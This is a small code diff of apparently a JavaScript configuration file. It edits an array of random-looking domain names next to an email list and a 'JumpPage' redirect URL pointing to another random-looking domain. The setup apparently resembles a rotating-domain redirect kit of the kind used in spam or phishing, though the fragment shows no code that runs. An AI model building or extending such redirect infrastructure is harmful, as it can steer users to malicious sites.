@@ -37,9 +37,10 @@ var emails = [
 ];
 
 var urls=[
+        'cifkqgjp.cc',
 	'kksfosdn.me',
         'nxzlfxy.cc',
-        'deiltwl.net',
+     
 ];
                                                                                                                   
 var JumpPage="https://kwftpliv.com";
